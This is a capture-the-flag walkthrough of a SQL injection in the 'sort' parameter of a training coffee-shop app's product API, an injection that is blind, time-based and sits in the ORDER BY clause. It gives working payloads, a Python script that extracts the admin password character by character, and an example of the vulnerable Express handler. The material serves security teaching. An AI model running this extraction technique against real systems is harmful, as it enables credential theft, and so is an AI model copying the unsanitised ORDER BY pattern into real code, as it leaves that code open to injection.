# cafeclub-013 - BugForge Lab Walkthrough

**URL:** https://lab-1789170604242-kx5l9s.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Blind SQL Injection (SQLite) via an undocumented ORDER BY parameter
**Flag:** `bug{3KtHk9uXozqe4K4VuoADV37PosX5SYE9}`

---

## Summary

CafeClub is a coffee shop SPA (product catalog, reviews, favorites, cart, checkout). The product
listing endpoint accepts an undocumented `sort` query parameter that the frontend never sends but
the backend interpolates unsanitized into a SQLite `ORDER BY` clause. Because the injection point
is the ORDER BY position, a UNION-based approach is not syntactically possible, so exploitation
requires a blind time-based technique. Using it to enumerate the schema and read the admin user's
row directly returns the flag.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT (Bearer token from registration)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/products` | GET | JWT | Documented params: `search`, `category`. Undocumented: `sort` - **vulnerable** |
| `/api/products/:id` | GET | JWT | Parameterized, not injectable |

---

## Discovery

### Step 1 - Map the real API surface from the bundle, not just the UI

The frontend at `/static/js/main.4078ec20.js` only ever calls `/api/products` with `search` and
`category`:

```js
const e={}; l&&(e.search=l), c&&(e.category=c);
const t = await So.get("/api/products",{params:e});
```

That is a narrower surface than what the backend likely accepts, so each documented and
undocumented-but-plausible parameter was tested directly against the live endpoint rather than
assumed absent.

### Step 2 - Rule out the obvious injection points

- `?search='` and `?category='` both returned a clean `[]` (no products matched a literal
  string containing a quote) with no server error, and classic boolean payloads
  (`' OR '1'='1`) did not widen the result set - both parameters are properly parameterized.
- `GET /api/products/:id` with a trailing `'` returned a clean `404 Product not found`, no
  database error - also parameterized.

### Step 3 - Find and confirm the real injection point

Testing every plausible extra query parameter, `sort` broke immediately:

```
GET /api/products?sort=price        -> 200, sorted ascending by price
GET /api/products?sort=price'       -> 500 {"error":"Database error"}
GET /api/products?sort=(SELECT sqlite_version()) -> 200 (executes without error - confirms SQLite
                                                     and that the value is evaluated as a raw
                                                     expression, not a whitelisted column name)
```

This confirms unsanitized string interpolation directly into `ORDER BY`.

### Step 4 - Work out what's actually exploitable from an ORDER BY injection point

`ORDER BY` is the last clause of a SQL statement, so a `UNION SELECT` cannot be appended from
this position - confirmed by testing several UNION shapes, all returning `500`. The only viable
techniques are boolean-blind or time-based blind. A straightforward error-oracle approach
(`CASE WHEN (cond) THEN 1 ELSE nonexistent_function() END`) does not work either: SQLite resolves
function names for both CASE branches at prepare time regardless of which branch would actually
run, so it errors unconditionally and looks like "not injectable" if that's the only technique
tried.

The working oracle is time-based, gated on a genuinely per-row-independent expression:

```
sort=(CASE WHEN (<condition>)
      THEN (SELECT COUNT(*) FROM products p1,products p2,products p3,products p4,
                                    products p5,products p6,products p7)
      ELSE 1 END)
```

The `ELSE` branch must be a constant (`1`), not a row-dependent value like `id` - otherwise
SQLite cannot treat the whole expression as constant across the result set and re-evaluates the
heavy branch once per output row, which blows through the application's own request timeout and
returns `500` regardless of the condition's truth value. With a constant `ELSE`, a true condition
takes about 5 seconds (a 7-way self join over the 16-row `products` table) and a false condition
returns in well under a second, cleanly and repeatably.

### Step 5 - Enumerate schema and extract the flag

Using the oracle against `sqlite_master` and `pragma_table_info(...)`:

- Tables: `users, products, reviews, favorites, orders, order_items, cart_items`
- `users` columns: `id, username, email, password, role, address, phone, full_name, created_at`
- A single admin user exists at `id=1`

Checking field lengths on that row, `password` came back as exactly 37 characters - matching the
`bug{...}` flag format - and a per-character binary search over
`unicode(substr((SELECT password FROM users WHERE id=1), N, 1))` recovered it directly.

---

## Proof of Concept

```python
import time, urllib.request, urllib.parse, urllib.error

BASE = "https://lab-1789170604242-kx5l9s.labs-app.bugforge.io"
TOKEN = "<jwt from /api/register>"
HEAVY = ("(SELECT COUNT(*) FROM products p1,products p2,products p3,products p4,"
         "products p5,products p6,products p7)")

def timed_request(sort_val, timeout=25):
    q = urllib.parse.urlencode({"sort": sort_val})
    url = f"{BASE}/api/products?{q}"
    r = urllib.request.Request(url, headers={"Authorization": f"Bearer {TOKEN}"})
    t0 = time.time()
    try:
        urllib.request.urlopen(r, timeout=timeout)
        code = 200
    except urllib.error.HTTPError as e:
        code = e.code
    return code, time.time() - t0

def oracle(bool_expr, threshold=2.5):
    payload = f"(CASE WHEN ({bool_expr}) THEN {HEAVY} ELSE 1 END)"
    code, dt = timed_request(payload)
    assert code == 200, "oracle broke - check payload syntax"
    return dt > threshold

def get_char(subquery, pos, lo=32, hi=126):
    while lo < hi:
        mid = (lo + hi) // 2
        expr = f"unicode(substr(({subquery}),{pos},1)) <= {mid}"
        if oracle(expr):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)

target = "SELECT password FROM users WHERE id=1"
flag = "".join(get_char(target, i) for i in range(1, 38))
print(flag)
# -> bug{3KtHk9uXozqe4K4VuoADV37PosX5SYE9}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| UNION SQLi on `/api/products/:id` | 404, parameterized | Not injectable |
| Quote/boolean payloads on `?search=`/`?category=` | Clean `[]`, no widened result set | Properly parameterized |
| `UNION SELECT ...` appended to the `sort` value | Always `500` | ORDER BY is the last clause - a UNION cannot follow it in valid SQL |
| `CASE WHEN (cond) THEN 1 ELSE nonexistent_fn() END` as an error oracle | `500` for every condition, true or false | SQLite resolves function names for both branches at prepare time, independent of which branch executes |
| Heavy computation gated by `CASE WHEN (cond) THEN (heavy) ELSE id END` (row-dependent `ELSE`) | `500` regardless of condition | Non-constant `ELSE` forces per-row re-evaluation of the heavy branch, exceeding the app's own query timeout |

---

## Root Cause

The product listing handler builds its `ORDER BY` clause by directly interpolating a
client-supplied value instead of validating it against an allowed column list:

```javascript
// Vulnerable pattern (approximate)
app.get("/api/products", authenticate, async (req, res) => {
  const { search, category, sort } = req.query;
  let query = "SELECT * FROM products WHERE 1=1";
  if (search) query += ` AND name LIKE '%${search}%'`; // parameterized in practice
  if (category) query += ` AND category = ?`;           // parameterized in practice
  if (sort) query += ` ORDER BY ${sort}`;                // NOT parameterized
  const products = await db.all(query);
  res.json(products);
});
```

`search`/`category` are handled safely, but `sort` is concatenated directly with no allowlist of
valid column names and no parameter binding, giving full control over an arbitrary SQL expression
in the ORDER BY position.

---

## CWE / OWASP

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- **OWASP A03:2021** - Injection
